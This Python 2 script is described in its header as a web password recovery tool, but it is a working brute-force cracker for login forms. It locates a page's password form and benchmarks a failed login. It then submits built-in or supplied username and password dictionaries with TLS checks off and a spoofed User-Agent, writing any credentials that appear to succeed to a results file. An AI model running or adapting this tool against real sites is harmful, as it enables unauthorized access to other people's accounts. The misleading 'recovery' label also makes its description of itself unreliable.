#!/usr/bin/env python
# coding: utf8

"""
一个 web 密码找回工具
版本: 0.2 (2016-01-08)
作者: MyKings&pt007@vip.sina.com
"""

import urlparse
import random
import urllib
import re
import time
import os,sys
import argparse
import requests
import codecs  #处理中文字符编码模块
from bs4 import BeautifulSoup

fp = codecs.open("result.txt","a","utf-8") #支持写入中文字符的方式
# 用户字典
USER_NAME_LIST = [
    'admin',
    'root',
    'test',
    'guest',
    'info',
    'adm',
    'user',
    'administrator',
    'oracle',
    'demo',
]

USER_PASSWD_LIST = [
    'admin', 'admin888', 'admin123','111111', '1234', '12345', '123456',
    '1234567', '12345678', 'abc123', 'dragon', 'iloveyou', 'letmein',
    'monkey', 'password', 'qwerty', 'tequiero', 'test', 'demo', 'guest'
]

# 参数匹配
INPUT_USER_REGEX = [
    'username',
    'j_username',
    'login',
    'name',
    'user',
    'account',
    'input1',
    'mail'
]

# 忽略侧桉树
INPUT_IGNORE_PARAM = [
    'captcha',
    'vcode',
    u'验证码',
]

DEBUG = False


def get_random_str(lenght=7):
    """返回指定长度的随机字符"""
    return ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', lenght))


def get_list_by_file(filehandler):
    """"""
    f_list = []
    if filehandler:
        for line in filehandler:
            if line.strip() not in f_list:
                f_list.append(line.strip())
    return f_list


def find_crack_form(config={}):
    """
    找到破解表单
    """
    target = None
    if config:
        u_parser = urlparse.urlparse(config['url'])
        resp = requests.get(config['url'],
                            timeout=config.get('timeout', 30),
                            headers=config.get('headers'),
                            verify=True)

        if resp and resp.content:
            target = {'action': '', 'cookie': '', 'method': 'GET', 'raw_data': '', 'input_list': []}
            soup = BeautifulSoup(resp.content, 'html.parser')

            # 0x00 分析出要破解的表单
            crack_from = None
            forms = soup.findAll('form')
            for form in forms:
                inputs = form.findAll('input')
                # 表单中是否有密码字段,密码次数为 1 才进行破解
                find_passwd_count = 0
                input_list = []
                for input in inputs:
                    if input.get('type') == 'password':
                        find_passwd_count += 1
                    input_list.append({
                        'type': input.get('type'),
                        'name': input.get('name'),
                        'id': input.get('id'),
                        'value': input.get('value')
                    })
                # 表单处理
                if find_passwd_count == 1:
                    crack_from = form
                    target['input_list'] = input_list
                    for item in input_list:
                        value = ''
                        if item['type'] == 'password':
                            value = '{{PASSWORD}}'
                        elif item['type'] == 'text':
                            for regex in INPUT_USER_REGEX:
                                if re.search(regex, item['id'] or item['name'], re.I):
                                    value = '{{USERNAME}}'
                                    break
                            #for regex in INPUT_IGNORE_PARAM:
                            #    if re.search(regex, item['name'] or item['id'], re.I):
                            #        print '[-] Discover authentication code [%s], exit to crack.' % item['name'] or item['id']
                            #        sys.exit(0)
                        # 处理非 password 与text类型
                        if not value and item['value']:
                            value = urllib.quote_plus(item['value'].encode(resp.encoding))

                        if item['name']:
                            name = item['name']
                        elif item['id']:
                            name = item['id']
                        else:
                            name = item['type']

                        target['raw_data'] += '%s=%s&' % (name, value)
                    break

            # 0x01 找到验证地址
            if crack_from:
                action = crack_from.get('action')
                if u_parser.path and '/' in u_parser.path and not str(action).startswith('/'):
                    file_path, file_ext = os.path.splitext(u_parser.path)
                    if file_ext:
                        file_path = os.path.dirname(file_path)
                    uri = '%s://%s%s/%s' % (u_parser.scheme,
                                             u_parser.netloc,
                                             file_path,
                                             action)
                else:
                    uri = urlparse.urljoin('%s://%s/' % (u_parser.scheme, u_parser.netloc), action)

                target['method'] = crack_from.get('method', 'GET')
                if target['raw_data']:
                    target['raw_data'] = target['raw_data'][:-1]
                if not action:
                    target['action'] = resp.url
                elif action and u_parser.netloc in action or 'http://' in action:
                    target['action'] = action
                else:
                    target['action'] = uri
                if resp and 'set-cookie' in resp.headers:
                    target['cookie'] = resp.headers['set-cookie']
                    if config['headers']:
                        config['headers']['Cookie'] = target['cookie']
    return target


def error_test(target={}, config={}):
    """
    错误测试
    """
    result = {}
    if target and target['action'] and config:
        if config['action']:
            action_url = config['action']
        else:
            action_url = target['action']
        result = {'stats_code': -1, 'content_lenght': -1, 'url': '', 'cookie': ''}
        err_user = get_random_str(5)
        err_pass = get_random_str(8)
        raw_data = target['raw_data'].replace('{{USERNAME}}', err_user)
        raw_data = raw_data.replace('{{PASSWORD}}', err_pass)
        if config['v']:
            print '[*] Test error data: [%s]' % raw_data
        if str(target['method']).upper() == 'GET':
            if '?' in target['action']:
                url = '%s&%s' % (action_url, raw_data)
            else:
                url = '%s?%s' % (action_url, raw_data)
            resp = requests.get(url,
                                timeout=config.get('timeout', 30),
                                headers=config.get('headers'),
                                verify=False)
        else:
            resp = requests.post(action_url,
                                 data=raw_data,
                                 timeout=config.get('timeout', 30),
                                 headers=config.get('headers'),
                                 verify=False)
        # TODO: 参数过滤判断
        result['stats_code'] = resp.status_code
        result['content_lenght'] = len(resp.content)
        result['url'] = resp.url
        

        if 'set-cookie' in resp.headers:
            result['cookie'] = resp.headers['set-cookie']
        elif 'cookie' in resp.headers:
            result['cookie'] = resp.headers['cookie']

    return result


def crack_form(target={}, err_result={}, config={}):
    """
    开始破解
    """
    user_info = None
    if target:
        if config['action']:
            action_url = config['action']
        else:
            action_url = target['action']
        find_name = False
        for user in config['user_list']:
            find_pass = False
            for passwd in config['passwd_list']:
                time.sleep(config['time'])
                raw_data = target['raw_data']
                if '{{USERNAME}}' in raw_data:
                    raw_data = target['raw_data'].replace('{{USERNAME}}', user)
                    find_name = True
                raw_data = raw_data.replace('{{PASSWORD}}', passwd)
                if config['v']:
                    print '[*] send crack data package: %s' % raw_data
                if str(target['method']).upper() == 'GET':
                    if '?' in target['action']:
                        url = '%s&%s' % (action_url, raw_data)
                    else:
                        url = '%s?%s' % (action_url, raw_data)
                    resp = requests.get(url,
                                        timeout=config.get('timeout', 30),
                                        headers=config.get('headers'),
                                        verify=False,
                                        allow_redirects = True)
                else:
                    resp = requests.post(action_url,
                                         data=raw_data,
                                         timeout=config.get('timeout', 30),
                                         headers=config.get('headers'),
                                         verify=False,
                                         allow_redirects = True)
                #resp.encoding = 'utf-8'
                content=resp.content #下面是为了解决content内容乱码
                #content = BeautifulSoup(resp.content, 'html.parser')
                  
                
                for error_info in config['error_list']:
                    status_error=content.count(error_info) #计算error_info字符出现的次数
                    #print 'error_info=%s ,status_error=%s\n %s' %(error_info,status_error,resp.text)
                    print 'error_info=%s ,status_error=%s\n' %(error_info,status_error)
                                      
                if err_result and resp:
                    if 'cookie' in resp.headers:
                        cookies = resp.headers['cookie']
                    elif 'set-cookie' in resp.headers:
                        cookies = resp.headers['set-cookie']
                    else:
                        cookies = None

                    result = {
                        'stats_code': resp.status_code,
                        'content_lenght': len(resp.content),
                        'url': resp.url,
                        'cookie': cookies
                    }

                    if err_result['content_lenght'] != len(resp.content) and resp.status_code in (302, 200):
                        if resp.url != err_result['url'] or (cookies and cookies != err_result['cookie']):
                            if DEBUG:
                                print '<', '-'*40
                                print 'DEBUG:', result
                                print '-'*40, '>'
                            if find_name and status_error==0:
                                user_info = {'u': user, 'p': passwd}
                                sp='[+] == successful, user: [%s], password: [%s] ==\n' % (user, passwd)
                                print sp
                                fp.write(sp)
                                fp.flush()
                            elif status_error==0:
                                user_info = {'p': passwd}
                                print '[+] == successful, password: [%s] ==' % passwd
                                find_pass = True
                                #break

            #if find_pass or find_name:
             #   break

    if not user_info:
        print '[-] form crack failure.'

    return user_info


def main(config={}):
    """"""
    if config and config['url']:
        try:
            target = find_crack_form(config)
            if DEBUG:
                print '<', '-'*40
                print 'DEBUG:', target
                print '-'*40, '>'
            err_result = error_test(target, config)
            if DEBUG:
                print '<', '-'*40
                print 'DEBUG:', err_result
                print '-'*40, '>'
            crack_form(target, err_result, config)
        except Exception as ex:
            print '[*] ERROR:', ex.message


def cmdline():
    parser = argparse.ArgumentParser(description='form crack tool.')
    parser.add_argument('-s', dest='url', required=True, help='login URL,http://login.com/')
    parser.add_argument('-a', dest='action', help='action URL,login')
    parser.add_argument('-t', dest='time', default=0, type=int, help='action URL')
    parser.add_argument('-v', action="store_true", help='show details')
    parser.add_argument('-u', help='username,admin')
    parser.add_argument('-U', type=file, help='username list file, dict/webuser.txt')
    parser.add_argument('-p', help='password,admin')
    parser.add_argument('-P', type=file, help='password list file, dict/sql_pass.txt')
    parser.add_argument('-E', type=file, help='erro info list file,dict/error.txt')
    args = parser.parse_args()
    config = args.__dict__

    if not config['url'].startswith('http'):
        config['url'] = 'http://%s' % config['url']
    config['user_list'] = []
    config['passwd_list'] = []
    config['timeout'] = 10
    config['headers'] = {}
    config['headers']['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 ' \
                                      '(KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36'
    config['headers']['Referer'] = config['url']
    config['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

    if config['U']:
        config['user_list'] = get_list_by_file(config['U'])
    if config['P']:
        config['passwd_list'] = get_list_by_file(config['P'])

    if config['u']:
        config['user_list'].append(config['u'])

    if config['p']:
        config['passwd_list'].append(config['p'])
    
    if config['E']: #密码错误时的提示
        config['error_list'] = get_list_by_file(config['E'])

    if not config['user_list']:
        config['user_list'] = USER_NAME_LIST
    if not config['passwd_list']:
        config['passwd_list'] = USER_PASSWD_LIST

    if config['v']:
        print 'target: [%s], user count: [%d], ' \
              'password count: [%d] ...' % (config['url'],
                                            len(config['user_list']),
                                            len(config['passwd_list']))

    return config


if __name__ == '__main__':
    main(cmdline())
